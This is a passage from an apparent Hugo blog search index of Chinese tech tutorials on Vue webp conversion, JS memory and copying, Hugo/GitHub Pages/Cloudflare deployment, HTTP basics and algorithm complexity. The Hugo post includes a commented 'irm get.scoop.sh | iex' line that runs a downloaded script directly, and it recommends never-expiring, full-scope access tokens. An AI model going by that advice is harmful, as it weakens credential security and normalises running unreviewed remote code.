\u0026gt;\u0026gt;\u0026gt; 2 // ... 生成器對象 Generator.prototype.next()：返回 yield 表達式生成的值。 Generator.prototype.close()：關閉生成器，因此執行該函式後調用next()方法時將會拋出 StopIteration 錯誤。 Generator.prototype.send()：用於將值發送到生成器。該值由yield表達式返回，並且返回下一個yield表達式生成的值。 Generator.prototype.throw()：向生成器拋出錯誤。 ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52276889089_0bb5aa46f7_o.png","permalink":"https://wayneblog.ga/2022-08-10/javascript-es6/","title":"Javascript ES6 特性"},{"content":" 參考網站\nVue CLI 官方webpack相關文檔\n前言 webp 是 2010年 Google 釋出的圖片格式，針對 PNG 可減少 26%，JPEG 約可減少 25% ~ 34%，目前僅 safari、IE 尚不支援，但 safari 在 ios 14 以後開始支援。 若在未提供 .webp 格式圖檔的情況下，使用套件於 webpack 時進行圖片轉檔，但於 development 下會因抓不到虛擬的 XXX.webp 圖檔而導致 npm run 起時噴錯，可使用以下設定解決此問題。 使用 webpack-plugin-image-transform-webp-and-mini 套件將 image 轉檔成 webp 格式 1 npm i webpack-plugin-image-transform-webp-and-mini 新增一個自訂的 webploader 此 loader 功用為：若 resource 的 query (使用 chainWebpack 提供的變數\u0026quot;resourceQuery\u0026ldquo;抓) 字符中含有 \u0026quot;type=webp\u0026quot; 且 resource 為圖片時，將附檔名轉換成 XXX.webp 。 1 2 3 4 5 6 7 8 9 10 11 12 const path = require(\u0026#34;path\u0026#34;) module.exports = function(source, map) { let result = source if (this.resourceQuery \u0026amp;\u0026amp; this.resourceQuery.includes(\u0026#34;type=webp\u0026#34;) \u0026amp;\u0026amp; !this.resource.includes(\u0026#34;data:image\u0026#34;)) { let extname = path.extname(this.resourcePath) result = source.replace(extname, \u0026#34;.webp\u0026#34;) } // return result this.callback(null, result, map) } chainWebpack 設定 套件安裝完成後，vue.config.js 引入套件，並指定webp圖檔存放位置。 引入自訂的 webploader ， 並設定 chainWebpack 的 images 需優先跑 webploader，再跑 url-loader 與 file-loader。 主要解決 Vue-cli 的 development 下，會因實際不存在 \u0026ldquo;XXX.webp\u0026rdquo; 圖檔而導致開發時報錯的問題。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // ... const ImageminWebpWebpackPlugin = require(\u0026#34;webpack-plugin-image-transform-webp-and-mini\u0026#34;) // ... chainWebpack: config =\u0026gt; { // ... config.plugins.delete(\u0026#34;preload-index\u0026#34;) config.plugins.delete(\u0026#34;prefetch-index\u0026#34;) // 相關設定建議放於移除 preload-index 與 prefetch-index 之後 config.plugin(\u0026#34;webP\u0026#34;).use(ImageminWebpWebpackPlugin, [ { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34;, logger: false, paths: { dir: path.resolve(__dirname, \u0026#34;./src/assets\u0026#34;), exclude: [] }, miniOptions: false } ]) let rule = config.module.rule(\u0026#34;images\u0026#34;) rule.uses.clear() rule .use(\u0026#34;./webploader.js\u0026#34;) .loader(\u0026#34;./webploader.js\u0026#34;) .end() .use(\u0026#34;url-loader\u0026#34;) .loader(\u0026#34;url-loader\u0026#34;) .options({ limit: 4096, fallback: { loader: \u0026#34;file-loader\u0026#34;, options: { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34; } } }) // ... } 補上是否支援 Webp 的判斷，若支援則於 \u0026lt;html\u0026gt; 補上 class name，供CSS抓取 class name 後改讀 webp 圖片 main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 async function isSupportWebp() { return new Promise(resolve =\u0026gt; { let result = false const elem = document.createElement(\u0026#34;canvas\u0026#34;) if (elem.getContext \u0026amp;\u0026amp; elem.getContext(\u0026#34;2d\u0026#34;)) { result = elem.toDataURL(\u0026#34;image/webp\u0026#34;).indexOf(\u0026#34;data:image/webp\u0026#34;) === 0 } resolve(result) }) } // 使用自定义过滤器 filter(Vue) ;(async () =\u0026gt; { Vue.prototype.$supportWebp = await isSupportWebp() if (Vue.prototype.$supportWebp) { document.documentElement.classList.add(\u0026#34;webp\u0026#34;) } })() 若有使用 vue-lazyload，則補上 vue-lazyload 提供的 webp 相關設定 \u0026lt;img\u0026gt; 使用 v-lazy 時，src的圖片附檔名皆會轉換成 XXX.webp 1 2 3 4 5 6 7 8 9 10 vue.use(VueLazyload, { filter: { webp(listener) { if (vue.prototype.$supportWebp \u0026amp;\u0026amp; !~listener.src.indexOf(\u0026#34;.webp\u0026#34;)) { listener.src = listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;) listener.el.setAttribute(\u0026#34;data-src\u0026#34;, listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;)) } } } }) 於各個 CSS 中，若 background 使用到需轉 .webp 格式的 img ，補上自行設定的 query (\u0026quot;?type=webp\u0026quot;)，以便 webploader 抓該 query 進行轉換圖檔格式 例如： 1 2 3 4 5 6 7 8 9 10 .page-wrap-main { background: url(\u0026#34;~assets/images/main/bg.png\u0026#34;); background-size: cover; width: 100%; position: relative; .webp \u0026amp; { background-image: url(\u0026#34;~assets/images/main/bg.png?type=webp\u0026#34;); } } ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52282467469_7cf86509a9_o.jpg","permalink":"https://wayneblog.ga/2022-08-10/vue-cli-use-webp/","title":"Vue-cli plugin：使用套件將圖片自動轉檔為webp格式"},{"content":" 參考網站\nJavaScript的記憶體空間 在 JavaScript 中，每一個數據都需要一個記憶體空間。記憶體空間分為兩種，棧記憶體（stock） 與 堆記憶體（heap）。 棧是系統自動分配的記憶體空間，由系統自動釋放，堆則是動態分配的記憶體，大小不定不會自動釋放。 基礎資料型別 JavaScript 中的基礎資料型別，這些值都有固定的大小，儲存在 棧記憶體中，由系統自動分配儲存空間，在棧記憶體空間的值，我們可以直接進行操作，因此基礎資料型別都是按照值訪問。 在棧記憶體中的資料發生複製的行為時，系統會自動為新變數開闢一個新的記憶體空間，當複製執行後，兩個記憶體空間的值就互不影響，改變其中一個不會影響另一個 棧記憶體空間資料複製示例 1 2 3 4 5 6 var a = `I am variable a`; var b = a; console.log(b); //`I am variable a` b = `I am variable b`; console.log(a); //`I am variable a` console.log(b); //`I am variable b` 引用資料型別 引用型別的值是儲存在 堆記憶體中的物件，在 JavaScript 中我們不能直接操作物件的堆記憶體空間。因為引用型別的值都是按引用訪問的，所以在操作物件時，實際上是操作物件的引用而不是實際的物件。 引用可以理解為儲存在棧記憶體中的一個地址，該地址指向堆記憶體中的一個實際物件。 引用型別值的複製，系統會為新的變數自動分配一個新的棧記憶體空間 這個棧記憶體空間，儲存著與被複制變量相同的指標，儘管他們在棧記憶體中的記憶體空間的位置互相獨立，但是在堆記憶體中訪問到的物件實際上是同一個，因此當我們改變其中一個物件的值時，實際上就是改變原來的物件。 棧記憶體空間儲存指標（地址），堆記憶體空間儲存實際的物件，我們通過變數訪問物件時，實際上訪問的是物件的引用（地址）。 記憶體中的棧區域存放變數（基本型別的變數包括變數宣告和值）以及指向堆區域儲存位置的指標（引用型別的變數包括變數宣告和指向內容的指標）。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var a = { name : `I am object a`, type : \u0026#39;object\u0026#39; } var b = a; console.log(b); // {name: \u0026#34;I am object a\u0026#34;, type: \u0026#34;object\u0026#34;} b.name = `I am object b`; console.log(a); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} console.log(b); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} 基本型別總結 基本資料型別： 基本資料型別 包括 null、undefined、number、string、boolean、symbol(es6) 存放位置 記憶體中的棧區域中 比較 值的比較，判斷是否相等，如果值相等，就相等。一般使用 === 進行比較，因為 == 會進行型別的轉換 拷貝 賦值（通過 = 賦值操作符來賦值），兩個變數的值之間相互沒有影響 引用型別總結 包括 陣列、物件、函式 存放位置 記憶體的棧區域中存放變數和指標，堆區域儲存實際的物件 比較 是引用的比較（就是地址的比較，變數在棧記憶體中對應的指標地址相等就指向同一個物件）判斷是否為同一個物件，示例如下 變數a和變數b的引用不同，物件就不是同一個物件 1 2 3 var a = {name:\u0026#39;Jay\u0026#39;}; var b = {name:\u0026#39;Jay\u0026#39;}; a===b //false 我們對JavaScript中引用型別進行操作的時候，都是操作其物件的引用（儲存在棧記憶體中的指標） 賦值、深拷貝和淺拷貝 (Assignment, deep copy and shallow copy) 賦值：兩個變數的都指向同一個物件，改變其中一個，另一個也會受到影響。 所謂拷貝就是複製，通過複製原物件生成一個新的物件。 淺拷貝 重新在堆記憶體中開闢一個空間，拷貝後新物件獲得一個獨立的基本資料型別 資料，和原物件共用一個原物件內的引用型別 資料，改變基本型別 資料，兩個物件互不影響，改變其中一個物件內的引用型別 資料，另一個物件會受到影響。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;發如雪\u0026#39;, year:2007 } } var obj1 = obj; function shallowCopy(obj){ var scObj = {}; for(var prop in obj){ if(obj.hasOwnProperty(prop)){ scObj[prop] = obj[prop] } } return scObj; } var obj2 = shallowCopy(obj); console.log(obj === obj1,\u0026#39;obj === obj1\u0026#39;,\u0026#39;賦值\u0026#39;); console.log(obj === obj2,\u0026#39;obj === obj2\u0026#39;,\u0026#39;淺拷貝\u0026#39;); // true \u0026#34;obj === obj1\u0026#34; \u0026#34;賦值\u0026#34; // false \u0026#34;obj === obj2\u0026#34; \u0026#34;淺拷貝\u0026#34; console.log(obj.song === obj2.song); //true obj2.song.name=\u0026#39;雙截棍\u0026#39;; obj2.name=\u0026#39;Jay\u0026#39;; console.log(obj) // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj1); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj2); {name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} console.log(obj===obj1) //true console.log(obj===obj2) //false 深拷貝 不論是物件內的基本型別還是引用型別 都被完全拷貝,拷貝後兩個物件互不影響。 一種比較簡單實現方法是使用 var dcObj = JSON.parse(JSON.stringify(obj)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;發如雪\u0026#39;, year:2007 } } var dcObj=JSON.parse(JSON.stringify(obj)); console.log(dcObj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;發如雪\u0026#39;,year:2007}} console.log(dcObj.song === obj.song); //false dcObj.name=\u0026#39;Jay\u0026#39;; dcObj.song.name=\u0026#39;雙截棍\u0026#39;; console.log(obj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;發如雪\u0026#39;,year:2007}} console.log(dcObj); //{name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;雙截棍\u0026#39;,year:2007}} 比較：賦值、深拷貝、淺拷貝： 賦值 新物件仍然指向原物件，改變新物件的基本型別和引用型別的值都會使原物件對應的值一同改變。 淺拷貝 改變新物件基本型別的值不會使原物件對應的值一起改變，但是改變新物件引用型別的值會使原物件對應的值一同改變。 深拷貝 改變新物件基本型別和引用型別的值，都不會影響原物件，兩者互相獨立，互不影響。 ","date":"2022-08-09T00:00:00Z","image":"https://live.staticflickr.com/65535/52277851687_14d13f49a6_o.jpg","permalink":"https://wayneblog.ga/2022-08-09/js-deep-copy-vs-shallow-copy/","title":"JavaScript的記憶體空間、賦值和深淺拷貝"},{"content":" 安裝 hugo homebrew (MacOs) 1 brew install hugo scoop (Windows) 1 2 3 4 5 6 7 8 9 10 11 12 # 若未安裝過 Scoop，需先： # 1. 第一次需先設定，允許遠端腳本 # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser # 2. 下載並安裝 Scoop # irm get.scoop.sh | iex # 透過 Scoop 安裝 Hugo scoop install hugo # or 安裝擴展版本 # scoop install hugo-extended apt-get (Linux) 1 sudo apt-get install hugo 利用 hugo 建立網站 1 2 # 進到本地資料夾根目錄後 hugo new site . --force 下載主題模板 (以 hugo-theme-stack 為例) 1 git submodule add git://github.com/CaiJimmy/hugo-theme-stack/ themes/hugo-theme-stack clone 完畢後，把 exampleSite 文件夾中的 config.yaml 複製到站點目錄下，同時刪除此目錄下的 config.toml 文件。\n將 exampleSite/content/* 複製到站點目錄下的 content/\n剩餘主題的設定與文章內容，可依個人需求自行設定，本篇不再贅述。\ngithub 創建一個 public 的 repo，用於存放發布用的 public 資料夾。 前往 repo 的 Settings -\u0026gt; Pages 設定好欲發布的分支與 root path 設定完畢後，github 會分配給你一個公開的網址：https://{your-account}.github.io/{your-repo-name}/，若不需自定義網址與 CI/CD 流程，到此步驟即可完畢。\n設定自定義網址 註冊一個網址 本文使用 freenom 註冊一組免費的網址 註冊完畢後，前往 Manage Domain 選擇 Management Tools -\u0026gt; NameServers 後，此頁面先暫時放置著，待會再回來繼續設定 前往 Cloudflare 後台 登入 Cloudflare 後台，並選擇 網站 DNS 設定如圖： 將註冊的 domain 設定指向到 github server ip 185.199.108.153 185.199.109.153 185.199.110.153 185.199.111.153 設定 CNAME www 指向到剛剛 github 分配給你的 domain (path不需要)： https://{your-account}.github.io/ 將下方兩個 Cloudflare 名稱伺服器複製下來 選擇 Use custom nameservers (enter below) 將剛剛從 Cloudflare 複製的兩個 NameServer，貼到 NameServer 1、NameServer 2 Cloudflare 後台設定強制使用 SSL 點選 SSL/TLS 的 邊緣憑證 打開 一律使用HTTPS 回到 github pages，將網址填寫至 Custom domain，短暫驗證完畢後，即可點選 Save 送出設定 自定義網址已設定完畢，可使用網址打開網站。\n設定 github actions 做 CI/CD 準備材料1：生成 github personal access tokens 前往 github 的個人設定 \u0026quot;Settings\u0026quot;，下方點選 Developer settings\n點選 Generate new token\n設定備註、過期時間、權限後即可生成 token\n建議過期時間可以設定 No expiration (無過期時間)、權限設定 repo 全部勾選 生成後，token 請複製起來，因為關閉此頁面後，將無法再取得該 token 的明碼。\n準備材料2：登入 Cloudflare 後台，取得 區域識別碼(Zone) 登入 Cloudflare，選擇自己的 domain 點選 概觀，並於圖中標示處取得 區域識別碼(Zone Id) 準備材料3：取得 Global API Key 於 概觀 下方點選 取得您的 API Token 點選 檢視，輸入密碼後取得 Global API Key 準備材料4：生成 API token 點選 建立 Token -\u0026gt; 建立自訂 Token 設定 token 名稱、權限、TTL PS：權限必須至少擁有 區域 -\u0026gt; 快取清除 -\u0026gt; 清除，以便 CI/CD 後使用 token 清除 DNS cache 設定完畢後即可建立 token 建立後，也請將 token 複製起來，因為關閉此頁面後，將無法再取得該 token 的明碼。 材料準備完畢，開始設定 secret 進入 source code 的 repo，點選 Settings -\u0026gt; Secret -\u0026gt; Actions，並將剛剛的四個準備材料設定到 Actions secrets 中 此處 Actions secrets 的名稱如需修改，則待會的 github-actions.yml 內的名稱也需跟著修改，否則會抓不到 secrets 中設定的值哦!\n於 source code repo 根目錄新增 .github/workflows/github-actions.yml github-actions.yml 內容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 name: Auto build and publish to public site repository # 只有推送到 main 才觸發 on: push: branches: - \u0026#34;main\u0026#34; pull_request: branches: [\u0026#34;main\u0026#34;] jobs: hugo-publish: name: publish content to public site runs-on: ubuntu-latest steps: # 使用當前 source code 的 repo - name: checkout source code repo uses: actions/checkout@v3 with: # 因為目前的 repo 有使用到 submodule(hugo themes)，所以 submodule 也要一併同步，不然原本的 repo 是沒有 submodule 的內容 submodules: true token: ${{ secrets.ACCESS_TOKEN }} # public 網站是放置在另一個 repo 所以這裡也要 clone 一份下來處理 # 因為我 Hugo 預設是產生檔案到 public 資料夾，所以將 public repo clone 到 ./public/ 內，以便後續 publish - name: clone and checkout public repo uses: actions/checkout@v3 with: # 這裡是 public 網站在 github 上的 repo 名稱 repository: {template/template-public-repo-name} path: public # tip: 需事先產生一把 personal access token 放到 repo 的 secrets 裡 # 然後 secrets 裡的名稱就叫 ACCESS_TOKEN # 參考 https://help.github.com/en/actions/automating-your-workflow-with-github-actions/authenticating-with-the-github_token token: ${{ secrets.ACCESS_TOKEN }} # 使用別人做好的 Hugo Actions - name: setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: latest extended: true # 用 Hugo 產生檔案 - name: build content to public site working-directory: ./ # --cleanDestinationDir 清除舊檔案 run: hugo --minify --gc --cleanDestinationDir # 將檔案 commit 到 網站 public repo - name: deploy and publish updates working-directory: ./public # user.email 還有 user.name 可以取自己喜歡的，一定要設定不然會出錯 run: | # 當 git 有更動時才進行動作 if [[ `git status --porcelain` ]]; then git config --local user.email \u0026#34;{typing your email}\u0026#34; git config --local user.name \u0026#34;{typing your name}\u0026#34; git add . -A git commit -m \u0026#34;build: auto publish\u0026#34; git push origin else echo \u0026#34;content no changes\u0026#34; fi # 清除 cloudflare dns cache - name: clear cloudflare cache uses: nathanvaughn/actions-cloudflare-purge@master with: # Using Zone Id cf_zone: ${{ secrets.CLOUDFLARE_ZONE }} # Using API Token cf_auth: ${{ secrets.CLOUDFLARE_API_TOKEN }} 內容 {} 內的資訊請更換成自己的資訊\n附上 yaml 範例，詳細 github-actions.yaml 文件請查閱 github 官方文件\n建立檔案後，將 commit push 後，即可於 source code repo 的 Actions 頁面查看 CI/CD 的過程。 ","date":"2022-08-01T00:00:00Z","image":"https://live.staticflickr.com/65535/52274839367_8325e83fea_o.jpg","permalink":"https://wayneblog.ga/2022-08-01/hugo-github-pages-actions-and-cloudflare/","title":"架設部落格之一條龍免費寶典：Hugo 生成靜態網站、Pages 發布網站、設定 custom domain(free 12 months)、Actions 做 CI/CD"},{"content":" 參考網站 - 初學者都該學會的 HTTP 通訊協定基礎\n參考網站 - Http/2 是什麼?\n目前 HTTP 通訊協定的版本 HTTP/0.9 於 1991 年發表(已廢止) HTTP/1.0 於 1996 年 5 月發表(RFC 1945) HTTP/1.1 於 1997 年 1 月發表(RFC 2068) 於 1999 年 6 月發布 HTTP/1.1 更新版(RFC 2616) 於 2014 年 6 月再次更新 HTTP/1.1 並將規格文件拆成六份 HTTP/2(Wikipedia) 於 2015 年 5 月發布(RFC 7540)(瀏覽器相容性) 僅針對 HTTP/1.1 的 Message Syntax 部分作出強化 HTTP/0.9 (已廢止) 概要 於 1990 年由 Tim Berners-Lee 提出最初的 HTTP 建議(WWW)\n實作重點\n用戶端要求是以 ASCII 字元為主(單行命令即可發出請求 GET/) 用戶端要求會以一個 換行字元 (CRLF) 來結束 伺服器回應是以 ASCII 字元為主，回應內容是 HTML 文件 每次執行完 Request / Response 就會自動關閉連線 主要特色\nClient / Server 架構、Request / Response 協定 跑在 TCP/IP 上的 ASCII 協定 (要求/回應) 被設計用來傳輸 HTML 文件 每完成一次 ASCII 協定就會自動關閉連線 使用 bash 測試 1 2 3 4 5 6 7 8 # 建立連線到 google $ telnet google.com 80 \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about \u0026gt; ... HTTP/1.0 概要 在 1991 到 1995 年之間，所謂 瀏覽器 騰空出世！\n於 1996 年 5 月發表 HTTP/1.0 版 (RFC 1945)\n與 HTTP/0.9 不同的部分\n用戶端要求是以 ASCII 字元為主，但可發送多行命令(含要求標頭) 先送出要求方法，再送出要求標頭，最後以一個額外的換行字元結束 伺服器回應是以 ASCII 字元為主，回應內容會區分為 狀態列 回應標頭 回應內文主體(不僅僅是 HTML 文件，可以是更多內容類型) 每完成一次 Request / Response 交握就會自動關閉 TCP/IP 連線 使用 bash 測試 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # 建立連線到 google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about HTTP/1.0 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # 取得後，會自動中斷 TCP 連線 # 若需再發送請求，需重新建立 TCP 連線 $ telnet google.com 80 ... HTTP/1.1 概要 於 1997 年 1 月發表 HTTP/1.1 版 (RFC 1945)\n於 1999 年 6 月發布 HTTP/1.1 更新版 (RFC 2616)\n與 HTTP/1.0 不同的部分\n傳輸協議的效能改進(新增不少 HTTP 標頭定義) 持續連線狀態(persistent connection) 切塊編碼傳輸(chunked encoding transfer) 位元範圍請求(byte range request) 額外快取機制(cache control) 請求管線作業(request pipelining)(需搭配持續連線狀態特性才能用) 使用 bash 測試 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 建立連線到 google $ telnet google.com 80 \u0026gt; Trying 172.217.24.14... \u0026gt; Connected to google.com. \u0026gt; Escape character is \u0026#39;^]\u0026#39;. # 發送 GET 請求 $ GET /about HTTP/1.1 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.0 301 Moved Permanently \u0026gt; ... # 取得後，不會自動中斷 TCP 連線，可再發送請求 $ GET /abc HTTP/1.1 Host: www.google.com # 因一個 domain 可以 hosting 多個網站，因此通常都會於 request header 再標記 Host \u0026gt; HTTP/1.1 404 Page Not Found \u0026gt; ... 目前 HTTP/1.1 的六大規格 RFC 7230 HTTP/1.1：Message Syntax and Routing RFC 7231 HTTP/1.1：Semantics and Content(最重要) RFC 7232 HTTP/1.1：Conditional Requests RFC 7233 HTTP/1.1：Range Requests RFC 7234 HTTP/1.1：Caching RFC 7235 HTTP/1.1：Authentication 關於 HTTP 通訊協定的基本常識 無狀態特性(stateless)：相同的 request，都會得到相同的 response，不會因為狀態不同而改變 分散式架構(distributed)：相同的 request，不同載體發送，都會得到相同的 response 協作的架構(collaborative)：不一定只有 client / server，也可以是 client / proxy / reverse proxy / server 超文本(hypertext = not just \u0026ldquo;text) but with \u0026ldquo;links\u0026rdquo;)：除了內容，還包含連結 初學者應了解 HTTP 的基本運作方式 如何發出 HTTP 要求(HTTP Request)\n要求方法(Request Methods) GET、POST、PUT、DELETE、PATCH、\u0026hellip; 要求標頭(Request Headers) Connection、COntent-Type、\u0026hellip; 斷行符號(CRLF) 要求內容主體(Request Body) 如何回應 HTTP 訊息(HTTP Response)\n回應狀態碼(Response Status Codes) HTTP/1.1 200 OK 回應標頭(Response Headers) 斷行符號(CRLF) 回應內容主題(Response Body) HTTP/2 HTTP/2 各個瀏覽器的支援度 點我查看瀏覽器支援度\nEdge / Firefox / Chrome / Opera 皆在 2015 年起就支援 HTTP/2，基本上不需要太擔心主流瀏覽器的支援性問題。\nPS：如何在 Node.js 中使用 HTTP/2\nHTTP/2 改善了什麼？ http/2標準發布於2015年5月，其主要目的是透過一些措施改善瀏覽器瀏覽網頁 加載的速度(page load) 。目前大多數的瀏覽器已支援 http/2 (chrome, firefox, safari等)標準，又 http/2與 http/1.1有著高度的相容信，舉凡request method(post, get..etc), http status code, url, header 等等，因此對於web developer來說，只需要確保你的網站有支援https(因為瀏覽器只支援https 在http/2上)。那麼http/1.1與http/2到底相差多快呢，點我體驗!\nHTTP/2 是如何改善？ 只需要單一網路連線 (Single TCP connection) 只需要單一網路連線，就可以連接網站伺服器，下載所有需要的資源。大大節省 HTTP/1.1 需要一直建立多個網路連線時的啟動時間浪費。\nRequest and response multiplexing (多路複用) 在 http/1.1 中，client 端時常會同時發起多個 request 至 server 拿取檔案(像是js, css, image等)，以此方式達到快速載入頁面。如下圖在 http/1.1 中會同時與 server 建立3個 TCP connection，但是瀏覽器通常會限制 TCP connection 同時建立的數目。因此在 http/2 協定中，允許 client 端與同一 server 建立單一 TCP connection 並以非同步方式傳輸要的檔案。\n優先權設計 (Prioritization) 伺服器可以決定例如 CSS 或 JavaScript 檔案，哪些要優先傳送。\nHeader compression (標頭壓縮) 每一個 http 的傳輸中都會攜帶一組 header，在 http/1.1 中，header 會是以明文(plain text)傳輸大小通常會是500-800 bytes，若有攜帶 cookie 也有可能會更大。因此在 http/2 中，會將 request 以及 response 的 header 使用 HPACK 演算法壓縮 header 的內容，此方法壓縮後可以減少 85%-88% 的大小。\nServer push (伺服器推送) 在 http/1.1 中，通常 client 端 request 甚麼 server 就會回傳甚麼，例如: 當 client request html 那麼 server 將只會回傳 html。但在 http/2 中，允許 server 主動推送有相關的資料給 client，例如: 當 client 只 request html，但是 server 知道 client request 此 html 後續也會 request css, js 等，因此 server 就會在 client 沒有 request 的情況下主動推送 css, js 檔給 client。那 server 怎麼知道這些檔案是有相關性的呢? web developer 將需要 server push 的檔案加上特定的描述即可。(描述)\n不過，這個功能比較有爭議，一來他需要 Web 開發者額外描述有哪些檔案需要隨著 HTML 一起推送給瀏覽器，不是 Web 伺服器升級 HTTP/2 就自動會有。二來它不管瀏覽器是不是已經有快取這個資源，都會推送而造成頻寬浪費。因此實務上筆者認為可以改用瀏覽器的 Prefetch 功能，讓客戶端的瀏覽器自己處理即可。\nBinary framing layer (二進制影格層) 在 http/2 中，header 與 body 所挾帶的 property 與 http/1.1 相同(ex. verbs, methods)，然而兩者在傳輸上會有不同。在 http/2 中，會將 header 以及 body 編碼成二進制在 server 與 client 端中傳輸，在 http/1.1 中，則是以明文的方式傳輸。將訊息編碼成二進制進行傳輸，此特性是 http/2 的其他特性的根本基礎。\n冷知識：在 HTTP/1.1 定義了四種解析訊息的方式，在 HTTP/2 只需要一種。\n總結 根據 w3Techs 網站，目前使用http/2的網站有45.7%，未來確實會變成主流，身為軟體工程師，還是多少理解來的好。此篇文章僅記錄筆者蒐集資料彙整結果，若有任何錯誤資訊還請直接點出，萬分感謝。\n","date":"2022-07-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52276290470_787c77a1b5_o.jpg","permalink":"https://wayneblog.ga/2022-07-24/beginner-http-lesson/","title":"初學者都該了解的 HTTP 通訊協定基礎"},{"content":" 參考網站 - 初學者學演算法｜從時間複雜度認識常見演算法\n溫故知新 演算法的簡單定義：輸入 + 演算法 = 輸出 時間複雜度：衡量演算法執行好壞的工具 大 O 符號：用來描述演算法在輸入 n 個東西時，所需時間與 n 的關係 在 n 非常大時，好的演算法設計可以省下非常多時間 演算法的速度不是以秒計算，而是以步驟次數 實務上，我們只會紀錄最高次方的那一項，並忽略其所有的係數 目錄：常見的六種時間複雜度與演算法 O(1)：陣列讀取 O(n)：簡易搜尋 O(log n)：二分搜尋 O(nlogn)：合併排序 O(n²)：選擇排序 O(2^n)：費波那契數列 O(1)：陣列讀取 說明 時間複雜度為 O(1) 的演算法，代表著不管你輸入多少個東西，程式都會在同一個時間跑完。在程式設計中，最簡單的例子就是讀取一個陣列中特定索引值的元素(程式麻瓜先別急著吐血，且讓我們在下面慢慢說明)。\n陣列讀取 陣列是程式中儲存東西的一種容器，我們可以想像成一排已經編號好的櫃子。每一個櫃子上的編號我們稱為「索引值」（Index，在程式中這個編號通常從 0 開始），而櫃子裡的物品我們稱為「元素」。例如：假設神奇寶貝大師小明在一個名叫 Pokemons 的陣列裡依序放入他的神奇寶貝們，我們來複習一下陣列、元素、索引值的關係：\n在程式碼中我們把七隻神奇寶貝這樣表達：\n1 Pokemons = [\u0026#34;卡丘\u0026#34;,\u0026#34;胖丁\u0026#34;,\u0026#34;尼龜\u0026#34;,\u0026#34;比獸\u0026#34;,\u0026#34;呆獸\u0026#34;,\u0026#34;種子\u0026#34;,\u0026#34;小剛\u0026#34;] 這時，假設我們想要知道在這個 Pokemons 陣列中任一個編號所對應到的神奇寶貝，我們都只需要把這個編號對應的元素印出來，就能知道對應的神奇寶貝是誰了。如果我想知道這個陣列中的第 n 號櫃的神奇寶貝是誰（以下假設我們想知道 n= 0），在程式碼中我們可以這樣表達：\n1 2 3 4 n = 0 print(Pokemons[n]) \u0026gt;\u0026gt; \u0026#34;卡丘\u0026#34; 陣列讀取時，因為我們已經知道櫃子的索引值，不管放入的 n 等於多少，程式都可以在 “一個步驟” 就到達 n 所對應到編號的櫃子並取出該元素，像這樣的案例，我們就會說陣列讀取演算法的時間複雜度為 O(1)。\nO(n)：簡易搜尋 說明 時間複雜度為 O(n) 的演算法，代表著執行步驟會跟著輸入 n 等比例的增加。例如當 n = 8，程式就會在 8 個步驟完成。最簡單的例子，就是所謂的簡易搜尋。\n這邊要特別提醒一點，通常程式步驟的時間複雜度會是用程式執行會碰到的最壞狀況 (Worst Case) 來表示，詳細例子我們可以在下面看到。\n簡易搜尋 讓我們沿用上一段的 Pokemons 陣列作為例子。Pokemons 這一排櫃子裡有八隻神奇寶貝，假設每個櫃子的門都被關上，我們事前也不知道各個神奇寶貝的位置，這時如果想要知道「呆獸」神奇寶貝在哪裡時，我們第一個想到的方法會是什麼呢？\n最直觀地想，我們會從第一個櫃子開始試，一次開一個櫃子，直到找到「呆獸」為止。像這樣的搜尋方法，就是最經典簡單的「簡易搜尋」。\n在程式碼中，簡易搜尋的方法可以這樣表達：\n1 2 3 4 5 6 7 Pokemons = 